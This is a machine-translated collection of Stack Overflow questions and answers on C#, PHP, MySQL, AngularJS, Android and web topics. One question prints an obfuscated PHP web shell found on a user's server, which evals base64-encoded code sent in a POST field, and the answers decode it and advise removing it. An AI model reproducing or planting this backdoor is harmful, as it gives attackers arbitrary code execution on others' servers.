有人知道如何从自定义 Office 2013 插件中删除增强工具提示吗？

我在 Office 2010 插件中使用的自己的选项卡具有相同的 Ribbon.xml 描述。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T12:58:14.907

这似乎是[How to remove the ToolTip (Press F1 for more Help) from my word Addin的副本](https://stackoverflow.com/questions/6139785/how-to-remove-the-tooltip-press-f1-for-more-help-from-my-word-addin)

简而言之，您不能删除工具提示，这是[Microsoft](http://social.msdn.microsoft.com/Forums/en-US/vsto/thread/fd820223-f947-4c10-a3df-902e98c596ab/)的设计决定。

# c# - 我在获取 Forms To Stop Graphics 的坐标以越过它时发现了问题

> ID：15154307
> 
> 赞同：0
> 
> 时间：2013-03-01T09:21:30.620
> 
> 标签：c#, .net, graphics, drawing

在 Windows 窗体应用程序中，我创建了一个图形框或椭圆，当我开始在运行时移动它时，我希望这个图形不会从窗体中出来，我实现这个想法的一种方法是获取窗体的 X 和 Y 坐标和从我的图形对象的 x 和 y 坐标匹配它，但它不能正常工作我认为表单的 x 和 y 坐标不正确。

以下是我用来检测图形是否在表单内部或外部的代码。

```
float formX = this.Location.X;
float formY = this.Location.Y;
float formWidth = this.Width;
float formHeight = this.Height;

// x = my graphic x's coordinates
// y = my graphic y's coordinates 
// width = the width of my graphic or the x2 values of my graphic

if ((x > (formX + formWidth) || ((x + width) > (formX + formWidth))
   return true;
else
   return false; 
```

我刚刚在这里提到了简单的代码，并且只有 x 轴，它不能正常工作，即使图形显示在表格的角落， （ `formX`+ ）也更大。`width`

我希望你明白我的意思，请建议如何摆脱这种情况。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:28:36.683

当图像离开窗体的左边缘时，相关边缘的 x 坐标将小于 formX。当它离开表单的右侧时，它将大于 formX + formWidth，因此条件前半部分的比较是错误的方式 - 并且正在与错误的值进行比较：

```
if ((x < formX) || ((x + width) > (formX + formWidth)))
   return true;
else
   return false; 
```

至少，我假设这就是您想要的，逻辑可能与您所追求的相反，但这很容易解决。

您也可以稍微清理一下，因为不需要 if-else 语句：

```
return (x < formX) || ((x + width) > (formX + formWidth)); 
```

# jquery - Jquery MVC 4客户端验证不起作用

> ID：15154309
> 
> 赞同：1
> 
> 时间：2013-03-01T09:21:33.613
> 
> 标签：jquery, asp.net-mvc

我正在尝试在一个简单的 MVC 4 应用程序上使用 jQuery 验证插件——我在 MVC 3 中所做的事情没有问题，但我根本无法让它工作。

我希望验证在以下情况下触发：

1 - 我的控制失去焦点。

2-表单提交。

任何关于我错过的想法将不胜感激！

**_Layout.cshtml 中的脚本引用**

```
<!-- language-all: lang-html -->
<head>
    <meta charset="utf-8" />
    <title>@ViewBag.Title - AWC Web Console</title>
    <link href="~/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <meta name="viewport" content="width=device-width" />
    @Styles.Render("~/Content/css")
    @Scripts.Render("~/bundles/modernizr")
    <script src="@Url.Content("~/Scripts/jquery-1.7.1.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Scripts/jquery.validate.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.js")" type="text/javascript"></script>

</head> 
```

**带有验证 JS 的 Index.cshtml 标记应用于 Doc 就绪功能**

```
 <script type="text/javascript">

        $(document).ready(function () {

        alert("doc ready");

        // JQuery client validation
        $("#prodIdFilterForm").validate(
            {
                onsubmit: true,
                rules: {
                    productId_str: {required: true, minlength: 10, number:true }
                },
                messages: { productId_str: "product Id must be entered" },
                // Force validation when control looses focus 
                onfocusout: function (element) {
                    alert("onfocusout");   // not entering this block !
                    $("#productId_str").removeAttr('style');
                    $("#productId_str").valid();   // fire validation
                    $(element).valid();
                }
                ,
                showErrors: function (errorMap, errorList)
                {
                    if (errorList.length > 0)
                    {
                        for (var i = 0; i < errorList.length; i++)
                        {
                            $("#" + errorList[i].element.id).css({ 'background-color': '#FFDFDF' });
                        }
                    }
                }
            }   
            );

    });  // DocReady

</script> 
```

**表单标记的主体**

```
@{
     ViewBag.Title = "Messages";
     Layout = "~/Views/Shared/_Layout.cshtml";
}

@using ( Html.BeginForm("SelectProduct", "WMSMessages", Model, FormMethod.Post, new {  @id = "prodIdFilterForm"} ) )
{
   <fieldset class="filtering">
      <legend>SelectExtensions Product</legend>
      <div>
         <b>Product Id:</b>
         @Html.TextBoxFor(model => model.productId_str, new { @id ="productId_str"}  )

         <div class="filterSubmitBox">
            <input type="submit" value="Show Messages" />
         </div>   
      </div>
   </fieldset>
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T10:08:25.120

对于客户端验证，微软使用 jquery.validate.unobtrusive.js 文件。 [客户端验证 asp.net mvc](http://www.asp.net/mvc/tutorials/older-versions/javascript/creating-a-mvc-3-application-with-razor-and-unobtrusive-javascript)

> 启用客户端验证
> 
> 要在 ASP.NET MVC 3 中启用客户端验证，您必须设置两个标志并且必须包含三个 JavaScript 文件。
> 
> 打开应用程序的 Web.config 文件。验证 ClientValidationEnabled 和 UnobtrusiveJavaScriptEnabled 在应用程序设置中是否设置为 true。根 Web.config 文件中的以下片段显示了正确的设置：

```
 <appSettings>
  <add key="ClientValidationEnabled" value="true"/> 
  <add key="UnobtrusiveJavaScriptEnabled" value="true"/> 
 </appSettings> 
```

将 UnobtrusiveJavaScriptEnabled 设置为 true 会启用不显眼的 Ajax 和不显眼的客户端验证。当您使用不显眼的验证时，验证规则将转换为 HTML5 属性。HTML5 属性名称只能由小写字母、数字和破折号组成

例如，如果您说电子邮件的必需属性及其错误消息。它会将数据属性附加到这样的元素。

```
 <input data-val="true"
        data-val-required="Email is required (we promise not to spam you!)."
        id="Email" name="Email" type="text" value="" /> 
```

将 ClientValidationEnabled 设置为 true 会启用客户端验证。通过在应用程序 Web.config 文件中设置这些键，您可以为整个应用程序启用客户端验证和不显眼的 JavaScript。您还可以使用以下代码在单个视图或控制器方法中启用或禁用这些设置：

欲了解更多信息：

1.  [Asp.net MVC 验证](http://www.devtrends.co.uk/blog/the-complete-guide-to-validation-in-asp.net-mvc-3-part-1)
2.  [MVC 客户端验证](https://stackoverflow.com/questions/8538082/asp-net-mvc-3-required-steps-for-unobtrusive-client-side-validation-of-dynamic)

# mysql - Mysql：哪个披萨更喜欢客户端

> ID：15154311
> 
> 赞同：0
> 
> 时间：2013-03-01T09:21:37.723
> 
> 标签：mysql, database

我有这个数据的表：

```
 1\. John | seafood pizza 
 2\. Mike | pepperoni pizza 
 3\. Mike | pepperoni pizza
 4\. John | original pizza 
 5\. Mike | original pizza 
 6\. John | seafood pizza
 7\. John | pepperoni pizza 
```

……

我怎样才能写一个查询给我这样的结果：

```
John | seafood pizza
Mike | pepperoni pizza 
```

如果客户有多个披萨的数量相同，则结果可能是任何披萨的名称。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:45:00.633

让我们一步一步来

以下查询将为您提供每个客户订购每种披萨的次数

```
SELECT name, pizza, COUNT(*) AS cnt 
FROM yourTable 
GROUP BY name, pizza 
```

那么我们如何从中获得最常订购的披萨呢？我们首先要知道，每个客户点的比萨饼数量最多是多少

```
SELECT name, MAX(cnt) AS cnt FROM (
  SELECT name, pizza, COUNT(*) AS cnt 
  FROM yourTable 
  GROUP BY name, pizza
) AS subquery GROUP BY name 
```

然后使用此数字选择实际的披萨名称

```
SELECT name, pizza, COUNT(*) AS cnt 
FROM yourTable AS t
CROSS JOIN (
  SELECT name, MAX(cnt) AS cnt FROM (
    SELECT name, pizza, COUNT(*) AS cnt 
    FROM yourTable 
    GROUP BY name, pizza
  ) AS subquery GROUP BY name
) AS sq
USING(name,cnt)
GROUP BY name, pizza 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:42:52.500

我将按用户和比萨饼对计数进行分组，然后将其用作查找分组最大值的查询的数据源（使用 max concat 技巧）。这并不难：

```
SELECT user, SUBSTRING(MAX(CONCAT(LPAD(freq, 6, '0'),pizza)),7)
FROM
(SELECT user, pizza, COUNT(*) AS freq
FROM user_likes
GROUP BY user, pizza) ilv
GROUP BY user 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-01T11:21:24.413

让我们有一个简单的解决方案：首先，我们有两列，名称和食物。您可以轻松列出最喜欢的顾客的食物：

```
CREATE TEMPORARY TABLE tbltemp AS (
SELECT name, food, COUNT( * ) c
FROM food
GROUP BY name, food
); 
```

现在我们按数量计算了所有食物。然后你可以按 count descending 来排序：

```
SELECT *
FROM tbltemp
ORDER BY c DESC 
```

现在您有一个描述您的客户最喜欢的列表。

更新 ：

而不是第二个查询，替换这个：

```
SELECT tbl1 . *
FROM (

SELECT name, food, COUNT( * ) c
FROM food
GROUP BY name, food
) AS tbl1, (

SELECT name, food, COUNT( * ) c
FROM food
GROUP BY name, food
) AS tbl2
WHERE tbl1.c = tbl2.c
AND tbl2.name = tbl1.name
AND tbl2.food = tbl1.food
AND tbl1.c = (
SELECT c
FROM tbltemp
ORDER BY c DESC
LIMIT 1 ) 
```

此查询结果是您的问题目标。

# angularjs - 如何使 $watch 函数在测试中执行？

> ID：15154313
> 
> 赞同：12
> 
> 时间：2013-03-01T09:21:54.150
> 
> 标签：angularjs, angularjs-directive

我正在实现一个简单的指令，该指令表示一个表单字段，其所有附加内容（如标签、错误字段、正则表达式）都在一行中。

该指令如下：

```
 <div ng-controller="parentController">

        {{username}}
<!-- the directive -- > 
        <form-field label="Username:" regex="someRegex" constrainsViolationMessage="someValidationMessage" model="username" place-holder="some input value">
        </form-field>
    </div> 
```

现在，我想测试指令范围和父范围之间的数据绑定。

测试是：

```
it("should bind input field to the scope variable provided by parent scope ! ", function () {
        var formInput = ele.find('.form-input');
        formInput.val("some input");
        expect(ele.find('p').text()).toEqual('some input');
    }); 
```

这个问题是我不知道为什么测试没有通过，即使指令正常工作。[这是指令的小提琴。](http://jsfiddle.net/Cuya7/22/)

这是整个测试和测试设置。

```
var formsModule = angular.module('forms', []);

formsModule.controller('parentController', function ($scope) {
});

formsModule.directive('formField', function () {

    var label;
    var constrainsViolationMessage;
    var placeHolder;
    var model;

    return {
        restrict:'E',
        transclude:true,
        replace:false,
        scope:{
            model:'='
        },
        link:function (scope, element, attr) {

            console.log("link function is executed .... ");

            scope.$watch('formInput', function (newValue, oldValue) {
                console.log("watch function is executed .... !")
                scope.model = newValue;
            });
            scope.label = attr.label;
        },
        template:'<div class="control-group ">' +

            '<div class="form-label control-label">{{label}}</div> ' +

            '<div class="controls controls-row"> ' +

            '<input type="text" size="15" class="form-input input-medium" ng-model="formInput"  placeholder="{{placeHolder}}">' +

            '<label class="error" ng-show={{hasViolationConstrain}}>{{constrainsViolationMessage}}</label>' +

            '</div>'
    }
});

beforeEach(module('forms'));

var ele;

var linkingFunction;

var elementBody;

var scope;
var text = "";
var placeHolder = "filed place holder";
var label = "someLabel";
var regex = "^[a-z]{5}$";

beforeEach(inject(function ($compile, $rootScope) {

        scope = $rootScope;

        elementBody = angular.element('<div ng-controller="parentController">' +
            '<p>{{username}}</p>' +
            '<form-field label="Username:" regex="someRegex" constrainsViolationMessage="someValidationMessage" model="username" place-holder="some input value"> </form-field>');

        ele = $compile(elementBody)(scope);
        scope.$digest();
    }
));

afterEach(function () {
    scope.$destroy();
});

iit("should bind input field to the scope variable provided by parent scope ! ", function () {
    var formInput = ele.find('.form-input');
    formInput.val("some input");
    expect(ele.find('p').text()).toEqual('some input');
}); 
```

如您所见，我想断言表单输入反映在父范围提供的“模型”属性中设置的范围变量中。

我在这里错过了什么吗？谢谢你帮助我……！

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-04-05T15:10:01.830

设置输入值后，您错过了`scope.$apply()`调用，因此更改永远不会被消化。在常规应用程序生命周期中，这会自动发生，但您必须在测试中手动触发

查看[https://github.com/angular/angular.js/blob/master/test/ng/directive/formSpec.js](https://github.com/angular/angular.js/blob/master/test/ng/directive/formSpec.js)以获取大量示例。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-06-25T11:00:24.213

添加条件后使用 $scope.$digest() 执行 watch。它会触发手表。

# html - 如何调试为什么单击链接在 IE8 / IE9 中不起作用？

> ID：15154323
> 
> 赞同：1
> 
> 时间：2013-03-01T09:22:19.020
> 
> 标签：html, internet-explorer, debugging, hyperlink

我有一个简单的 html 链接，它在 IE8 中没有任何作用。没有错误，它就在那里。它在 Chrome 和 FF 中运行良好。该链接只是一个可点击的图像：

```
<p><a id="google-purchase-link" href="/purchase/google" data-ajax="false"><img src="https://checkout.google.com/buttons/checkout.gif?merchant_id=763453611943044&w=180&h=46&style=trans&variant=text&loc=en_GB" alt="Proceed to Google Checkout"/></a></p> 
```

自己尝试一下：

1.  访问[http://www.oddprints.com/checkout](http://www.oddprints.com/checkout)
2.  点击“上传东西”
3.  点击“示例照片”
4.  点击“订购打印”
5.  点击“通过 Google 购买”

不用担心，您不会承诺购买任何东西！

在 IE 中，链接似乎不起作用，它就在那里。该链接仅指向 /purchase/google，它建立了购物车服务器端，然后返回一个临时重定向到填充的 Google 结帐页面。如果您访问[http://www.oddprints.com/purchase/google](http://www.oddprints.com/purchase/google)，它会很好地执行重定向。

有什么想法可以调试吗？

**更新：** 链接正在使用 javascript 处理。我必须专门将 href 属性添加到 window.location 以使其在 IE8 中工作，但问题仍然存在于 IE9 中。

改变：

```
$("#google-purchase-link").click(function(e){   
  _gaq.push(function() {
      var pageTracker = _gaq._getAsyncTracker();
      setUrchinInputCode(pageTracker);
      console.log(getUrchinFieldValue());
      window.location = "/purchase/google?analyticsData=" + getUrchinFieldValue();
  });
  e.preventDefault();
}); 
```

至

```
$("#google-purchase-link").click(function(e){   
  _gaq.push(function() {
      var pageTracker = _gaq._getAsyncTracker();
      setUrchinInputCode(pageTracker);
      console.log(getUrchinFieldValue());
      window.location.href = "/purchase/google?analyticsData=" + getUrchinFieldValue();
  });
  e.preventDefault();
}); 
```

**更新**：问题出在使用 console.log()。嗬！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:34:37.677

问题是使用 console.log()。嗬！

# php - PHP PDO 与 bindParam 与 bindValue？

> ID：15154328
> 
> 赞同：5
> 
> 时间：2013-03-01T09:22:38.407
> 
> 标签：php, pdo

**解决方案**

改变这个：

```
foreach($fields as $dbfield => $field) {
    $value = isset($_POST[$field]) ? 1 : 0;
    $STH -> bindParam( ':' . $dbfield, $value, PDO::PARAM_INT, 1 );
} 
```

对此：

```
foreach($fields as $dbfield => $field) {
    $value = isset($_POST[$field]) ? 1 : 0;
    $STH -> bindValue( ':' . $dbfield, $value, PDO::PARAM_INT );
} 
```

* * *

**问题**

我有以下代码，它没有给出任何错误，但它没有做我需要它做的事情：

**PHP**

```
$fields = array(
    'db_col_1'  => 'cb_1',
    'db_col_2'  => 'cb_2',
    'db_col_3'  => 'cb_3'
);

$parts = array();

foreach($fields as $dbfield => $field){
    $parts[] = '`' . $dbfield . '` = :' . $dbfield;
}

$DBH = new PDO( "mysql:host=localhost;dbname=db", "user", "pass" );
$DBH -> setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );

//temp id
$id = 1;

$STH = $DBH -> prepare( 'UPDATE `table1` SET ' . join(', ', $parts) . ' WHERE `id`= :id' );

$STH -> bindParam( ':id', $id, PDO::PARAM_INT, 10 );

foreach($fields as $dbfield => $field) {
    $value = isset($_POST[$field]) ? 1 : 0;
    $STH -> bindParam( ':' . $dbfield, $value, PDO::PARAM_INT, 1 );
}

$STH -> execute(); 
```

**HTML**

```
<input id="cb_1" name="cb_1" type="checkbox" value="cb_1" />
<br />
<input id="cb_2" name="cb_2" type="checkbox" value="cb_2" />
<br />
<input id="cb_3" name="cb_3" type="checkbox" value="cb_3" /> 
```

数据库会更新，但如果我选中复选框，如下所示：

**示例复选框状态**

```
cb_1 = 1
cb_2 = 1
cb_3 = 0 
```

db 中的每一列都得到`0`.

如果我检查复选框如下：

**示例复选框状态**

```
cb_1 = 0
cb_2 = 0
cb_3 = 1 
```

db 中的每一列都得到`1`.

有人知道怎么修这个东西吗？

可能是因为`bindParam`绑定了`$value`我认为在循环结束时具有基于的值的实际变量（通过引用）`$_POST['cb_3']`？

所以我想我应该使用`bindValue`? 但不确定如何..我检查了文档，但发现它令人困惑。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-01T09:29:04.143

[PDOStatement::bindParam()](http://php.net/manual/en/pdostatement.bindparam.php)是一种告诉 PDO 的方法：«当您稍后执行此语句时，请从该变量中读取值»。这意味着调用时`$STH -> execute()`必须`$value`存在并且必须保持其原始值。

由于您以这种方式使用它：

```
foreach($fields as $dbfield => $field) {
    $value = isset($_POST[$field]) ? 1 : 0;
    $STH -> bindParam( ':' . $dbfield, $value, PDO::PARAM_INT, 1 );
} 
```

...`$value`在每次循环迭代时都会被覆盖，并且您的值会丢失。（只剩下最后一个了。）

您需要使用[PDOStatement::bindValue()](http://php.net/manual/en/pdostatement.bindvalue.php)这意味着：«存储此值并稍后在执行语句时使用它»。这样，变量就不再需要了。

# c# - 一种在 C# 中编写大数字文字的方法

> ID：15154333
> 
> 赞同：5
> 
> 时间：2013-03-01T09:23:01.127
> 
> 标签：c#, numbers, decimal, literals

我有这样的方法：

```
Prefix GetPrefix(decimal value)
{
    if(value > 11000000000000000000)
        return Prefix.CosmicBig;
    if(value > 1000000000000000)
        return Prefix.ReallyBig;
    if(value > 3000000000000)
        return Prefix.Big;
    if(value > 50000000)
        return Prefix.Okay;
    if(value > 750000)
        return Prefix.MostlyNormal;
    if(value > 750000)
        return Prefix.SoSo;
    if(value > 750)
        return Prefix.Small;
    return Prefix.MiserablySmall;
} 
```

确切的值并不重要。重要的是它们有时会发生变化（前缀用于绘图，一些文本区域在开发过程中会改变大小）。我正在寻找一种编写这些文字的方法，这种方法可以让人类轻松阅读，而无需计算所有的零。分隔符会很好。我想过写作`11 * 1000 * 1000 * 1000 * 1000 * 1000 * 1000`，但这只是勉强可以管理。使用`Math.Pow()`它会更好一些，但我不喜欢使用这样的计算来定义常量。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-01T09:25:38.443

而不是`11000000000000000000`你可以使用`11e18`. 用来`m`表示它是一个小数，所以`11e18m`.

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-03-01T09:26:43.593

您可以为 引入扩展方法`int`：

```
750.Thousand();
5.Million();
100.Billion(); 
```

这些方法的实现很简单：

```
public static int Thousand(this int value)
{
    return value * 1000;
}

public static int Million(this int value)
{
    return value.Thousand() * 1000;
}

// etc. 
```

确保为更大数字的方法返回适当的数据类型：

```
public static long Billion(this int value)
{
    return value.Million() * 1000;
} 
```

不幸的是，您将不得不为您想要支持的每种整数或浮点类型编写这些方法。

拥有一整套这样的扩展方法可以让你以相对自然的方式表达你的大数，即使最后不只是全零：

```
100.Billion() + 30.Thousand() + 300 // == 100,000,030,300 
```

如果你想变得花哨，你甚至可以考虑嵌套它们：

```
100.Billion(30.Thousand(300)) 
```

但我认为这会失去一些表现力，因为人们会想知道参数的含义。

不过，实现看起来像这样：

```
public static long Billion(this int value, long add)
{
    return value.Million() * 1000 + add;
} 
```

* * *

使用这些扩展方法有一点缺点：您的数字不再是编译时常量。它们是在运行时计算的。在绝大多数情况下，这应该不是问题。

# r - 将比例转换为 R 中的数字

> ID：15154336
> 
> 赞同：2
> 
> 时间：2013-03-01T09:23:12.243
> 
> 标签：r

我有这个基本的统计问题：

我有 270 个 ABCD 类型的对象，比例为 9:3:3:1。我需要获取 ABC 和 D 类型的对象的数量。

我想知道是否有一种方便的方法可以在 R 中使用 oneliner 进行此计算，并且能够轻松地将数字 270 更改为任何数字。

是否有一个单线器，只要数字 N (270) 和比例 p1:p2:p3:p4 返回对象的数量，id est。

`N * p1 / sum(p1,p2,p3,p4)`

`N * p2 / sum(p1,p2,p3,p4)`

`N * p3 / sum(p1,p2,p3,p4)`

`N * p4 / sum(p1,p2,p3,p4)`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:27:39.400

像这样的东西？

```
gimmeNumber <- function(N, props) {
  (N * props)/sum(props)
}

gimmeNumber(N = 270, props = c(9, 3, 3, 1))
[1] 151.875  50.625  50.625  16.875 
```

# c#-4.0 - Jenkins CI Rss 提要

> ID：15154345
> 
> 赞同：0
> 
> 时间：2013-03-01T09:23:44.460
> 
> 标签：c#-4.0, rss, jenkins, continuous-integration

Jenkins 提供构建的 CSS 提要，我想为我正在构建的站点使用这些提要之一。IE 将毫无问题地获取提要……无需登录。

但是，当使用“WebClient”通过 C# 请求时，我得到一个响应，将我重定向到登录屏幕。

所有的安全都是通过 TeamForge 处理的，不允许匿名访问。鉴于 IE 无需授权即可读取提要，我可以通过 C# 执行此操作吗？

干杯

# android - 隐藏状态栏，但我的视图没有转到顶部

> ID：15154350
> 
> 赞同：1
> 
> 时间：2013-03-01T09:24:01.540
> 
> 标签：android, hide, statusbar

我用

```
mContext.getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
mContext.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
mContext.getWindow().getDecorView().requestLayout(); 
```

在 setContentView 之后隐藏状态栏。状态栏被隐藏了，但我的视图没有转到顶部。有一个黑色矩形
而不是状态栏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:29:42.280

您可以在该特定活动的清单文件中使用它。从java文件中删除上面的代码并将下面的代码放在活动的Manifest中

```
android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:40:48.540

要隐藏状态栏，请添加请求功能`no title`并标记为，`full screen`然后添加内容视图。

代码是

```
requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
setContentView(R.layout.activity_test); 
```

并且仅适用于通知栏

```
this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:30:08.933

这是解决方案：只需检查一下

```
// hide titlebar of application
    // must be before setting the layout
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    // hide statusbar of Android
    // could also be done later
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
    setContentView(R.layout.main); 
```

# mysql - 在 MySQL 中插入时从两个表中选择相同的列

> ID：15154352
> 
> 赞同：1
> 
> 时间：2013-03-01T09:24:07.027
> 
> 标签：mysql, sql

我在不同的数据库上有两个相同的表

```
Database : live
table : customer
id | name | email | address 
```

和

```
Database : test
table : customer
id | name | email | address | phone | post_code | company 
```

这只是示例结构。我在实时数据库表中有 15 个字段，在测试数据库表中有 35 个字段。我想编写一个查询，它可以将数据从实时插入到测试数据库表中。我怎样才能做到这一点。我试过这个

```
INSERT INTO test.customer
SELECT *
FROM live.customer as cd
WHERE NOT EXISTS(SELECT * from test.customer); 
```

如果它们的顺序不同，这会将数据插入错误的列中。
这是我尝试过的另一种方式

```
INSERT INTO test.customer (id,name,email,address)
SELECT *
FROM live.customer as cd
WHERE NOT EXISTS(SELECT * from test.customer); 
```

这很好，但我不想写 15 个列名。如何从实时数据库表中选择所有列并将其结果放入插入的 () 中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:45:54.153

我不认为有一个纯 SQL 解决方案。但是您可以使用以这种方式创建的动态查询：

```
SET @sql = null;

SELECT
  CONCAT('INSERT INTO test.customer (',
    group_concat(CONCAT('`', COLUMN_NAME, '`') separator ','),
    ') SELECT ',
    group_concat(CONCAT('`', COLUMN_NAME, '`') separator ','),
    ' FROM live.customer WHERE NOT EXISTS(SELECT * from test.customer)')
FROM `INFORMATION_SCHEMA`.`COLUMNS` 
WHERE `TABLE_NAME`='customer' AND `TABLE_SCHEMA`='test'
INTO @sql;

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SELECT * FROM test_customer; 
```

请[在此处](http://sqlfiddle.com/#!2/5c6b2/5)查看小提琴。

# php - 如何在我的一个脚本中解码这个 php 代码

> ID：15154353
> 
> 赞同：1
> 
> 时间：2013-03-01T09:24:13.357
> 
> 标签：php

我在我的 php 文件中有这个。看起来像一些恶意软件，但我想知道它是什么意思它在做什么

```
<?php //cb6f82f3e4007bdaccf419abafab94c8
 $_=
//system file do not delete
'CmlmKGlzc2V0KCRfUE9TVFsiY29kZSJdKSkKewogICAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29kZSJdKSk7Cn0=';
 //system file do not delete
$__ = "JGNvZGUgPSBiYXNlNjRfZGVjb2RlKCRfKTsKZXZhbCgkY29kZSk7";$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:35:09.233

看看[base64_decode](http://www.php.net/manual/en/function.base64-decode.php)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:38:46.940

`$___`代表`base64_decode`。然后`$__`是 base64_decode 并进行评估，它执行以下操作：

```
$code = base64_decode($_);
eval($code); 
```

最终执行此操作：

```
if(isset($_POST["code"]))
{
    eval(base64_decode($_POST["code"]));
} 
```

我建议您删除它并检查其他文件是否被感染。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:35:29.743

eval — 将字符串计算为 PHP 代码

# 警告

> eval() 语言结构非常危险，因为它允许执行任意 PHP 代码。因此不鼓励使用它。如果您已仔细验证除了使用此构造之外别无选择，请特别注意不要将任何用户提供的数据传入其中，而无需事先正确验证。

一个简短的例子：

```
<?php

    $string = 'cup';
    $name = 'coffee';
    $str = 'This is a $string with my $name in it.';
    echo $str. "\n";
    eval("\$str = \"$str\";");
    echo $str. "\n";
?> 
```

输出

```
This is a $string with my $name in it.
This is a cup with my coffee in it. 
```

# javascript - window.navigate vs response.redirect，有什么区别？

> ID：15154354
> 
> 赞同：0
> 
> 时间：2013-03-01T09:24:17.230
> 
> 标签：javascript, dom-events, response.redirect

`window.navigate`和有什么区别`response.redirect`？我尝试过使用`response.redirect("URL")`，但是当我使用它时它不起作用`window.navigate(URL)`！

两者有什么区别？我知道一种用于 Java，另一种用于 JavaScript，但它们的用例是什么？

```
<body>

<%
    HttpSession sess = request.getSession(true);

    if (sess.getAttribute("username") == null
            || sess.getAttribute("password") == null) {
%>
<script>
window.navigate("login.jsp");
</script>
<%      
    } 
%>

</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:29:19.387

一种是导致服务器发出 HTTP 重定向。

另一种要求服务器将整个 HTML 文档发送到浏览器，浏览器解析 HTML，浏览器执行 JavaScript……然后断开返回按钮。

# jquery - Jquery 添加删除类

> ID：15154355
> 
> 赞同：0
> 
> 时间：2013-03-01T09:24:22.093
> 
> 标签：jquery

我正在使用下面的代码在运行时更改 Jquery FocusOut 中的类

```
$("#txtNewAttributes").focusout(function () {
    var attributeTextBox = $("#txtNewAttributes").val()
    if ($.trim(attributeTextBox) == "Height")
        $(txtNewValues).removeClass('alphaonly').addClass('numbersonly');
    if ($.trim(attributeTextBox) == "string" || $.trim(attributeTextBox) == "string2")
        $(txtNewValues).removeClass('numbersonly').addClass('alphaonly');
}); 
```

并且正在使用页面中加载的类名进行验证。

我的问题是在 FireBug 中，我看到 Class name 已更改为`txtNewValues`，但仍然没有触发预期的验证（alphaonly,numbersonly）。

我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:31:57.417

可能仅在 focusout 事件上触发仅数字和仅 alpha 验证。当您在同一事件上分配类时，可能是执行顺序导致此问题的原因。请先检查一下。

如果是这种情况，那么您可以从以下帖子中获得帮助。

[事件排序](https://stackoverflow.com/questions/290254/how-to-order-events-bound-with-jquery)

# iphone - UIButton 名称在第一次从 UITablView 索引单元名称中选择时不会更改

> ID：15154357
> 
> 赞同：0
> 
> 时间：2013-03-01T09:24:23.310
> 
> 标签：iphone, ios, uibutton

```
NSLog(@"%@",appDelegate.strSlctdCntry);
btnSlctCurrency.titleLabel.text = [NSString     stringWithFormat:@"%@",appDelegate.strSlctdCntry];
btnSlctCurrency.titleLabel.textAlignment = UITextAlignmentCenter; 
```

上面的代码是`NSLog(@"%@",appDelegate.strSlctdCntry);`index name get from`UITablView`是 OK 但按钮名称第一次没有改变。它只是第二次改变。

为什么会这样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:28:54.787

用途：用于设置按钮标题：

```
[btnSlctCurrency setTitle:[NSString stringWithFormat:@"%@",appDelegate.strSlctdCntry] forState:UIControlStateNormal]; 
```

对齐

```
[btnSlctCurrency setContentHorizontalAlignment:UIControlContentHorizontalAlignmentLeft]; 
```

# sql - 一个连接检索空列

> ID：15154361
> 
> 赞同：2
> 
> 时间：2013-03-01T09:24:31.333
> 
> 标签：sql

我有 2 个表

```
create table Students(
SerialNumber int primary key identity,
                    Name varchar(50) not null,
                    Surname varchar(50) not null,
                    AcademicProgram int foreign key references AcademicProgrammes(Id)
                 )
Create table AcademicProgrammes(
                                Id int primary key identity,
                                Name varchar (20) not null
                           ) 
```

我想从学生表中获取所有学生，但是 AcademicProgram 引用外键我想要 AcademicProgrammes 的名称。

我的加入看起来像这样：

```
select Students.SerialNumber,Students.Name, Students.Surname, AcademicProgrammes.Name
from Students left join
AcademicProgrammes on Students.SerialNumber=AcademicProgrammes.Id 
```

